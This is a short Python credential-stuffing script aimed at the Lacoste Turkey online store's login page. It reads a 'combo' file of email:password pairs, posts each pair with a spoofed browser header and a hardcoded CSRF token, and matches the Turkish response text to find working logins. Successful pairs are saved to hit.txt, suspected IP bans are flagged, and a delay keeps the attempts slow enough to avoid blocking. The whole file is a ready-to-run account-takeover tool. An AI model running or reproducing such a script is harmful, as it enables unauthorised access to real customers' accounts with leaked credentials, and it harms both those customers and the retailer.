import requests, time, os

try:
    from cfonts import render
except:
    os.system('pip install python-cfonts')

output = render('   RICK    LACOSTE  ', colors=['white', 'blue'], align='center')
print(output)

def login(email, password):
    r = requests.post("https://www.lacoste.com.tr/users/login/", headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache", "Accept": "*/*"
    }, data={
        "csrfmiddlewaretoken": "LcI4df56vjqtQDWDUHS32nZJSOwm64UUystpTMaM8koJkaiaWQBaEGwiF1NJ3FIL",
        "email": email, "password": password, "next": "/account/"
    })

    if "E-posta veya şifre hatalı." in r.text: 
        print(f"❌ Başarısız {email} {password}")
    elif "/account" in r.url: 
        print(f"✅ Başarılı {email} {password}")
        open("hit.txt", "a").write(f"{email}:{password}\n")
    else: 
        print(f"❌ IP ban {email} {password}")


for line in open(input("Combo: ")):
    login(*line.strip().split(":"))
    time.sleep(5)
